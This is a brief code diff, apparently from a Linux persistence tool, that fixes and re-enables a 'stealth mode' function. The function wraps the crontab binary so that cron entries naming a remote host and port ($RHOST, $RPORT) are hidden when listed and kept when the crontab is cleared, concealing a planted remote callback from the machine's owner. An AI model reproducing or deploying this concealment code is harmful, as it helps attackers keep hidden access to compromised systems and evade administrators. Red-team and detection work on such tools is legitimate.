@@ -203,7 +203,7 @@ stealth_modifications(){
 		fi #linpercrontab
 	elif $(echo "$1" | grep -qi "\-r"); #linpercrontab
 	then #linpercrontab
-		if $(`$REALBIN -l | grep "'$RHOST'" | grep -qi "'$RPORT'"`); #linpercrontab
+		if $($REALBIN -l | grep "'$RHOST'" | grep -qi "'$RPORT'"); #linpercrontab
 		then #linpercrontab
 			$REALBIN -l | grep --color=never "'$RHOST'" | grep --color=never "'$RPORT'" | crontab #linpercrontab
 		else #linpercrontab
@@ -508,8 +508,7 @@ main() {
 
 	if [ "$STEALTHMODE" -eq 1 ];
 	then
-		echo "[+] --stealth-mode is currently broken"
-		#stealth_modifications
+		stealth_modifications
 	fi
 	
 	find_writable
